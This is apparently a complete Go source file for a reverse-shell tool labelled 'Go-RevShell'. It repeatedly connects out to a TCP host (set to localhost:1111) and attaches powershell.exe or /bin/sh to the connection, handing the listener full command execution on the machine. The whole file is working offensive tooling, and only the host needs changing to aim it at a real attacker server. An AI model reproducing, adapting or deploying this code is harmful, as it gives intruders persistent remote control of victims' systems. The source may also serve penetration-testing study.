package main

import (
	"net"
	"os/exec"
	"runtime"
	"strconv"
	"time"
)

const banner string = `
  ____                   ____                   ____    _              _   _
 / ___|   ___           |  _ \    ___  __   __ / ___|  | |__     ___  | | | |
| |  _   / _ \   _____  | |_) |  / _ \ \ \ / / \___ \  | '_ \   / _ \ | | | |
| |_| | | (_) | |_____| |  _ <  |  __/  \ V /   ___) | | | | | |  __/ | | | |
 \____|  \___/          |_| \_\  \___|   \_/   |____/  |_| |_|  \___| |_| |_|

`

func main() {
	reverseShell("localhost", 1111)
}

func reverseShell(host string, port int) {
	for {
		connexion, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
		if err != nil {
			time.Sleep(2 * time.Second)
		} else {
			connexion.Write([]byte(banner + "[+] Connected to " + connexion.LocalAddr().String() + "\n"))
			if runtime.GOOS == "windows" {
				spawnShell(connexion, "powershell.exe")
			} else {
				spawnShell(connexion, "/bin/sh")
			}
		}
	}
}

func spawnShell(connexion net.Conn, shell string) {
	cmd := exec.Command(shell)
	cmd.Stdout, cmd.Stderr, cmd.Stdin = connexion, connexion, connexion
	cmd.Run()
}
